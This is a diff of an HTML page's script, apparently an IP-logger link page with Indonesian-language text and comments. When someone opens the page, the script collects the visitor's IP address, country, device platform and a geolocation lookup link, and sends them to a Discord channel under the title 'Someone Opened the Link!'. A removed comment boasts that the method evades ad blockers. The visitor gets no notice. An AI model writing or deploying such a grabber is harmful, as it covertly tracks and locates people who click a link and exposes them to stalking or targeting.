@@ -70,12 +70,10 @@
             if (key) infoMap[key] = value;
         });
 
-        // Karena Cloudflare hanya memberi IP & Lokasi Kode Negara, 
-        // kita kirim data minimal yang penting pasti TERKIRIM.
-        const infoFinal = `🌐 **IP Address:** ${infoMap.ip}\n` +
-                          `📍 **Negara:** ${infoMap.loc}\n` +
-                          `📱 **Data Center:** ${infoMap.colo}\n` +
-                          `🔍 **Info:** Data ini lebih aman dari blokir AdBlock.`;
+const infoFinal = `🌐 **IP Address:** ${infoMap.ip}\n` +
+                  `📍 **Negara:** ${infoMap.loc}\n` +
+                  `🗺️ **Lacak Lokasi:** [Klik di Sini](https://www.infobyip.com/ip-${infoMap.ip}.html)\n` +
+                  `🔍 **Info Perangkat:** ${navigator.platform}`;
 
         sendToDiscord("🔔 Seseorang Membuka Link!", infoFinal, 3447003);
 
@@ -144,4 +142,5 @@
     </script>
 </body>
 </html>
+
 
